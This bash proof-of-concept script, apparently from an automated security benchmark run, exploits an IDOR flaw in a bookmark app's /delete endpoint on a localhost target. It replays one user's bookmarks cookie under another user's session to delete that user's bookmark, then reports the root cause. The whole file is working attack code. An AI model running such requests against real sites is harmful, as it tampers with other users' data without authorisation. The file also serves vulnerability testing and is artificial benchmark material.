#!/bin/bash
# POC: Demonstrates IDOR vulnerability in /delete endpoint - unauthorized deletion of bookmarks owned by other users
# Target: ./repo
# Created: 2025-12-01T15:46:39.128Z
# Session: benchmark-XBEN-075-24-minbd1zc

# IDOR Vulnerability POC - Unauthorized Bookmark Deletion
# This script demonstrates that the /delete endpoint does not verify bookmark ownership
# An attacker can delete another user's bookmarks by manipulating the bookmarks cookie

set -e

TARGET_URL="${1:-http://localhost:5000}"
echo "[*] Target URL: $TARGET_URL"

# Step 1: Create a session for User A and add bookmarks
echo "[*] Step 1: Creating User A session and adding bookmarks..."

# Create User A session with initial empty bookmarks
USER_A_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/list" 2>&1)
USER_A_BOOKMARKS_COOKIE=$(echo "$USER_A_RESPONSE" | grep -i "set-cookie.*bookmarks" | head -1 | sed 's/.*bookmarks=\([^;]*\).*/\1/')
USER_A_USER_COOKIE=$(echo "$USER_A_RESPONSE" | grep -i "set-cookie.*user" | head -1 | sed 's/.*user=\([^;]*\).*/\1/')

if [ -z "$USER_A_USER_COOKIE" ]; then
    echo "[-] Failed to get User A cookies"
    exit 1
fi

echo "[+] User A session created"
echo "    user cookie: $USER_A_USER_COOKIE"
echo "    initial bookmarks: $USER_A_BOOKMARKS_COOKIE"

# Add bookmark for User A: "UserASecret1"
echo "[*] Adding bookmark 'UserASecret1' for User A..."
ADD_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "user=$USER_A_USER_COOKIE; bookmarks=$USER_A_BOOKMARKS_COOKIE" \
  -d "name=UserASecret1&url=http://secret1.com" 2>&1)

USER_A_BOOKMARKS_COOKIE=$(echo "$ADD_RESPONSE" | grep -i "set-cookie.*bookmarks" | head -1 | sed 's/.*bookmarks=\([^;]*\).*/\1/')
echo "[+] Bookmark added. Updated bookmarks cookie: $USER_A_BOOKMARKS_COOKIE"

# Add second bookmark for User A: "UserASecret2"
echo "[*] Adding bookmark 'UserASecret2' for User A..."
ADD_RESPONSE2=$(curl -s -i -X POST "$TARGET_URL/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b "user=$USER_A_USER_COOKIE; bookmarks=$USER_A_BOOKMARKS_COOKIE" \
  -d "name=UserASecret2&url=http://secret2.com" 2>&1)

USER_A_BOOKMARKS_COOKIE=$(echo "$ADD_RESPONSE2" | grep -i "set-cookie.*bookmarks" | head -1 | sed 's/.*bookmarks=\([^;]*\).*/\1/')
echo "[+] Second bookmark added. Updated bookmarks cookie: $USER_A_BOOKMARKS_COOKIE"

# Step 2: Verify User A's bookmarks exist
echo "[*] Step 2: Verifying User A's bookmarks..."
LIST_RESPONSE=$(curl -s -X GET "$TARGET_URL/list" \
  -b "user=$USER_A_USER_COOKIE; bookmarks=$USER_A_BOOKMARKS_COOKIE" 2>&1)

if echo "$LIST_RESPONSE" | grep -q "UserASecret1"; then
    echo "[+] UserASecret1 found in User A's bookmarks"
else
    echo "[-] UserASecret1 not found - test setup failed"
    exit 1
fi

if echo "$LIST_RESPONSE" | grep -q "UserASecret2"; then
    echo "[+] UserASecret2 found in User A's bookmarks"
else
    echo "[-] UserASecret2 not found - test setup failed"
    exit 1
fi

# Step 3: Create User B session
echo "[*] Step 3: Creating User B session..."
USER_B_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/list" 2>&1)
USER_B_USER_COOKIE=$(echo "$USER_B_RESPONSE" | grep -i "set-cookie.*user" | head -1 | sed 's/.*user=\([^;]*\).*/\1/')
USER_B_BOOKMARKS_COOKIE=$(echo "$USER_B_RESPONSE" | grep -i "set-cookie.*bookmarks" | head -1 | sed 's/.*bookmarks=\([^;]*\).*/\1/')

echo "[+] User B session created"
echo "    user cookie: $USER_B_USER_COOKIE"

# Step 4: IDOR Attack - User B uses User A's bookmarks cookie to delete User A's bookmark
echo "[*] Step 4: IDOR Attack - User B will now use User A's bookmarks cookie to delete UserASecret1..."
echo "    This demonstrates that /delete endpoint doesn't verify bookmark ownership"

DELETE_RESPONSE=$(curl -s -i -X GET "$TARGET_URL/delete?name=UserASecret1" \
  -b "user=$USER_B_USER_COOKIE; bookmarks=$USER_A_BOOKMARKS_COOKIE" 2>&1)

# Extract updated bookmarks cookie from deletion response
AFTER_DELETE_BOOKMARKS=$(echo "$DELETE_RESPONSE" | grep -i "set-cookie.*bookmarks" | head -1 | sed 's/.*bookmarks=\([^;]*\).*/\1/')

if [ -n "$AFTER_DELETE_BOOKMARKS" ]; then
    echo "[+] Delete request succeeded, bookmarks cookie updated"
    echo "    After-deletion bookmarks: $AFTER_DELETE_BOOKMARKS"
fi

# Step 5: Verify the bookmark was actually deleted
echo "[*] Step 5: Verifying if UserASecret1 was deleted..."
LIST_AFTER=$(curl -s -X GET "$TARGET_URL/list" \
  -b "user=$USER_B_USER_COOKIE; bookmarks=$AFTER_DELETE_BOOKMARKS" 2>&1)

if echo "$LIST_AFTER" | grep -q "UserASecret1"; then
    echo "[-] IDOR Attack FAILED - UserASecret1 still exists"
    exit 1
else
    echo "[+] IDOR Attack SUCCESSFUL - UserASecret1 has been deleted!"
fi

# Step 6: Verify UserASecret2 still exists (only one was deleted)
if echo "$LIST_AFTER" | grep -q "UserASecret2"; then
    echo "[+] Confirmed: UserASecret2 still exists (selective deletion worked)"
else
    echo "[!] Warning: UserASecret2 also deleted (unexpected)"
fi

echo ""
echo "========================================"
echo "[+] IDOR VULNERABILITY CONFIRMED"
echo "========================================"
echo "An attacker (User B) was able to delete a bookmark"
echo "(UserASecret1) that belongs to another user (User A)"
echo "by simply using User A's bookmarks cookie."
echo ""
echo "Root Cause: /delete endpoint does not verify that"
echo "the current user owns the bookmark being deleted."
echo "========================================"